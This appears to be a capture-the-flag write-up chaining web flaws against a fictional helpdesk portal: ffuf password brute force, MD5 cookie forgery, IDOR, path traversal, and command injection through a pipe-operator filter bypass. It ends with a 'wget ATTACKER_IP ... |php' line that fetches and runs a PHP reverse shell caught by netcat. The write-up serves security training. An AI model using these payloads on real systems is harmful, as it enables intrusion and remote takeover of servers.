# Support — Web Application CTF

## Overview

Support is an applied CTF that chains multiple web application vulnerabilities together against a fictional internal IT helpdesk portal. The attack path progresses from initial reconnaissance through credential cracking, cookie manipulation (MD5 hash bypass), IDOR on an internal API, LFI via path traversal to retrieve a master password, command injection via a time widget, and finally a PHP reverse shell for full remote code execution.

**Main objectives:** Gain initial access as a low-privilege user, escalate to administrator through chained vulnerabilities, and achieve full RCE via a PHP reverse shell.

**Skills applied:** Nmap service enumeration, Gobuster directory discovery, ffuf credential brute force, MD5 cookie manipulation, IDOR via API endpoint manipulation, LFI/path traversal to source code, command injection with pipe operator bypass, reverse shell delivery and execution via RCE.

---

## Concepts Covered

### Cookie Manipulation (MD5 Hash Bypass)

A cookie value was an MD5 hash of a boolean. Since MD5 is a one-way function without a secret key, the attacker independently hashes the target value and substitutes it:

- `isITuser` cookie = `MD5("false")` → identified by looking up the hash value
- Replace with `MD5("true")` → changes UI privileges
- No HMAC or server-side signature check → substitution accepted

### IDOR via Direct Object Reference

An internal API returned user data based on a numeric ID in the request. By modifying the ID parameter, data belonging to other users (including the admin) was accessible — classic horizontal BOLA/IDOR.

### LFI via Path Traversal

A URL-based path manipulation (`../config`) caused the application to load a different page, exposing the page's source code — which contained a hardcoded master password.

### Command Injection via Pipe Operator

A date/time widget made API calls accepting date functions. The server rejected direct command injection (`;` or `&&`), but the pipe operator (`|`) successfully chained arbitrary OS commands with the expected date function.

### Reverse Shell via RCE

After confirming command injection, the attacker:
1. Hosted a PHP reverse shell on an attacker-controlled HTTP server
2. Used `wget` via the injection point to download the shell to the target
3. Piped the downloaded file to PHP for execution
4. Caught the reverse shell connection on a Netcat listener

---

## Methodology

```
1. Nmap full port scan with service detection
2. Enumerate web directories with Gobuster
3. Identify valid credentials via ffuf + rockyou.txt
4. Log in and analyse cookies for manipulation vectors
5. Modify MD5-hashed cookie to change privilege indicator
6. Identify and exploit IDOR on internal API endpoint
7. Attempt path manipulation to access hidden resources
8. Recover master password from exposed source code
9. Log in as admin (noting character encoding issue)
10. Identify new functionality (time widget) post-admin login
11. Test command injection — find pipe operator bypass
12. Confirm injection with ls command
13. Retrieve flag via RCE (read /home/ubuntu/user.txt)
14. Set up reverse shell infrastructure
15. Deliver payload via wget + PHP execution chain
16. Catch reverse shell on Netcat listener
```

---

## Practical Activities

### Activity 1 — Nmap Enumeration

**Objective:** Identify open services on the target.

**Command:**
```bash
nmap -sC -sV -p- MACHINE_IP
```

**Flag breakdown:**
- `-sC` — run default NSE scripts (banner grab, service detection, version scripts)
- `-sV` — detect service versions
- `-p-` — scan all 65535 ports

**Findings:**
```
22/tcp  open  ssh     OpenSSH
80/tcp  open  http    Apache httpd
```

Two services: SSH and HTTP. The web application on port 80 is the primary attack surface.

---

### Activity 2 — Directory Enumeration

**Objective:** Discover non-linked directories and files on the web server.

**Command:**
```bash
gobuster dir -u https://MACHINE_IP \
             -w /usr/share/wordlists/dirbuster/directory-list.txt \
             -x php,txt,bak,js,zip
```

**Findings:**
```
/info.php
/skins/
/includes/
/api.php
/config.php
/dashboard.php
```

**Why this matters:** `/api.php` and `/config.php` are immediately interesting — APIs often have IDOR vulnerabilities, and config files may contain credentials. `/dashboard.php` suggests an admin area.

---

### Activity 3 — Credential Brute Force

**Objective:** Find the password for the known email `help@support.thm`.

**Command:**
```bash
ffuf -w /usr/share/wordlists/rockyou.txt \
     -X POST \
     -d "email=help@support.thm&password=FUZZ" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -u http://MACHINE_IP \
     -fs 2678
```

**Flag breakdown:**
- `-fs 2678` — filter by response size; the failed login response is 2678 bytes — filter it out to see only the successful match

**Finding:** Password discovered from the rockyou wordlist. Login successful.

---

### Activity 4 — Cookie Analysis and MD5 Manipulation

**Objective:** Identify and exploit a manipulable cookie to gain higher-level UI access.

**Observation:** After login, a cookie named `isITuser` was identified. The value was an MD5 hash — not a plain true/false boolean.

**Decode process:**
```bash
# Look up the hash at CrackStation.net
MD5 hash → decodes to "false"
```

**Manipulation:**
```bash
# Compute MD5 of "true"
echo -n "true" | md5sum
# → b326b5062b2f0e69046810717534cb09

# Set cookie: isITuser=b326b5062b2f0e69046810717534cb09
```

**Finding:** After substituting the hash of `"true"`, a new endpoint appeared on the homepage — redirecting to an internal user API.

**Why this works:** No HMAC or server-side signature verification. The server computed `md5("false")` when setting the cookie and checks `md5("true")` on the incoming request — any party can independently compute either value.

---

### Activity 5 — IDOR on Internal API

**Objective:** Access data for other users (specifically the admin) via the exposed API.

**Action:** The internal API endpoint accepted user IDs. By iterating IDs, the admin's email address was retrieved.

**Finding:** Admin email identified via IDOR. This provides the `username` for subsequent login attempts.

---

### Activity 6 — LFI via URL Path Manipulation

**Objective:** Recover the master password from server-side source code.

**Action:** Modified the URL to append `../config` to the current path:
```
/current_page/../config
```

**Finding:** The page's UI changed — indicating a different PHP file was loaded. Viewing the page source revealed a hardcoded master password in the PHP code.

**Why path traversal worked here:** The application loaded the page specified in the URL without sufficient path sanitisation. The `../config` traversal navigated to a config file that the developer did not intend to expose via the web interface.

---

### Activity 7 — Admin Login (Special Character Handling)

**Observation:** Initial login attempts with the admin email and discovered password failed.

**Investigation:** Closer inspection of the master password revealed it contained a special character (`@`) that was causing the login to fail — likely due to URL encoding or form submission handling.

**Fix:** Removed the `@` character from the password when submitting the login form.

**Finding:** Login as admin succeeded. First flag discovered on the admin homepage:

```
THM{I_AM_ADMIN999}
```

---

### Activity 8 — Command Injection via Time Widget

**Objective:** Achieve OS command execution through the newly-visible time widget.

**Observation:** A time/date widget appeared on the admin dashboard. Inspecting the source code revealed a PHP snippet that indicated the widget made API calls and used the time/date input.

**Initial test:** Tried direct command injection with `;` — server rejected it, responding that only date functions were accepted.

**Bypass with pipe operator:**
```
ls | date
```

or the equivalent POST body injection:

```
sys: date |ls
```

**Finding:** Server returned a full directory listing — command injection confirmed via pipe operator bypass.

**Why the pipe bypass worked:** The server validated that the input included a date function, but did not restrict the pipe operator that chained a second arbitrary command onto the end.

---

### Activity 9 — Read Flag via Command Injection (RCE)

**Objective:** Read the flag at `/home/ubuntu/user.txt` using the confirmed command injection.

**Payload:**
```
sys: date |cat /home/ubuntu/user.txt
```

**Finding:** Contents of `/home/ubuntu/user.txt` returned in the response.

**Why the database path was relevant:** The time widget source code also revealed the database file path — this was used to locate and read admin credentials directly, confirming the full admin password (including the `@` character that had prevented login).

---

### Activity 10 — Reverse Shell via RCE

**Objective:** Achieve a persistent interactive shell on the target server.

**Step 1 — Prepare reverse shell:**
Created a PHP reverse shell configured to connect back to the attacker's IP and port 4444.

**Step 2 — Start Netcat listener:**
```bash
nc -lvnp 4444
```

**Flag breakdown:**
- `-l` — listen mode
- `-v` — verbose
- `-n` — no DNS resolution
- `-p 4444` — listen on port 4444

**Step 3 — Start Python HTTP server to host the shell:**
```bash
python3 -m http.server 1234
```

**Step 4 — Deliver payload via command injection:**
```
sys: date |wget http://ATTACKER_IP:1234/revshell.php|php revshell.php
```

**Chain breakdown:**
- `wget http://ATTACKER_IP:1234/revshell.php` — downloads the reverse shell from the attacker's server to the target
- `|php revshell.php` — immediately pipes (executes) the downloaded file through PHP

**Step 5 — Catch the shell:**
The Netcat listener received the connection. The attacker now has an interactive shell running as the web server user.

**Final flag:**
```bash
cat /home/ubuntu/user.txt
# THM{GOT_THE_FLAG001}
```

---

## Full Attack Chain Summary

```
Nmap → 2 ports (SSH, HTTP)
     ↓
Gobuster → /api.php, /config.php, /dashboard.php
     ↓
ffuf → credential found (help@support.thm + password)
     ↓
Login → inspect cookies → isITuser is MD5 hash
     ↓
MD5 manipulation → new API endpoint visible
     ↓
IDOR on API → admin email discovered
     ↓
URL path traversal (../config) → source code exposed → master password found
     ↓
Admin login (strip @ from password) → Flag 1: THM{I_AM_ADMIN999}
     ↓
Time widget in admin UI → command injection via | operator
     ↓
RCE confirmed → read /home/ubuntu/user.txt
     ↓
Reverse shell: wget + php execution chain → Netcat catches connection
     ↓
Flag 2: THM{GOT_THE_FLAG001}
```

---

## Observations and Analysis

- MD5 cookie values without an HMAC signature are trivially manipulable — any hash lookup service decodes them, and any hash function can produce the replacement
- The LFI via URL traversal worked because the application loaded PHP files based on URL path segments without strict sanitisation — a design decision that assumed users would only request intended paths
- The pipe operator bypass worked because the server's validation checked for the presence of a date function but did not restrict what could follow. Validation should use allowlisting of the complete acceptable input format, not just checking for presence of a required component
- The `wget | php` chain is a reliable RCE delivery method when direct file uploads are not available — it uses the injection point to pull a payload from a remote source and execute it in a single command sequence
- The `@` character in the password causing login failure suggests the login form was applying URL encoding or some other transformation — always test passwords with special characters carefully

---

## Tools and Technologies Used

### Nmap
- **Purpose:** Port and service enumeration
- **Command:** `nmap -sC -sV -p- MACHINE_IP`

### Gobuster
- **Purpose:** Directory and file enumeration
- **Command:** `gobuster dir -u http://IP -w wordlist -x php,txt,bak,js,zip`

### ffuf
- **Purpose:** Credential brute force via form-based authentication
- **Command:** `-w rockyou.txt -X POST -d "email=...&password=FUZZ" -fs FAIL_SIZE`

### Netcat
- **Purpose:** Reverse shell listener
- **Command:** `nc -lvnp 4444`

### Python HTTP Server
- **Purpose:** Host malicious files for download by target via wget
- **Command:** `python3 -m http.server 1234`

---

## Key Learnings

- MD5 cookie values provide no tamper-resistance without an HMAC secret — any hash can be independently reproduced
- URL path traversal (`../`) works against PHP applications that load files based on URL segments without input sanitisation
- The pipe operator (`|`) can bypass command injection filters that check for presence of required components but don't restrict the full input
- `wget ATTACKER_IP/shell.php | php` is a compact, reliable RCE delivery mechanism
- Special characters in credentials require careful encoding awareness during exploitation — a login failure may be an encoding problem, not a wrong password
- Every privilege escalation step enabled the next: IDOR → admin email; LFI → master password; admin login → command injection; RCE → reverse shell

---

## Things Worth Remembering

- Gobuster `-x` flag: `php,txt,bak,js,zip` covers most valuable file types
- ffuf `-fs` filters by response size — use the failed login response size as the filter value
- MD5("true") = `b326b5062b2f0e69046810717534cb09`; check hashes at CrackStation
- LFI: `../` in URL segments can load unintended PHP files including config files with credentials
- Command injection bypass: if `;` is blocked, try `|`, `&&`, `||`, `&`
- Reverse shell chain: `nc -lvnp 4444` listener + `python3 -m http.server 1234` host + `wget http://ATTACKER/shell.php|php shell.php` injection
- Special characters in passwords (especially `@`) may cause issues in URL-encoded form submissions

---

## Conclusion

The Support CTF demonstrated the most important principle in web application penetration testing: individual findings chain together to produce significantly greater impact than any single vulnerability. A brute-forced password became an authenticated session; an MD5 cookie bypass revealed an IDOR vector; IDOR found the admin email; LFI exposed the master password; admin access revealed command injection; command injection became RCE; RCE became a persistent interactive shell. Each step was enabled by the information or access gained in the previous one. This reflects how real-world compromise chains work — rarely is a single critical vulnerability the entire story.
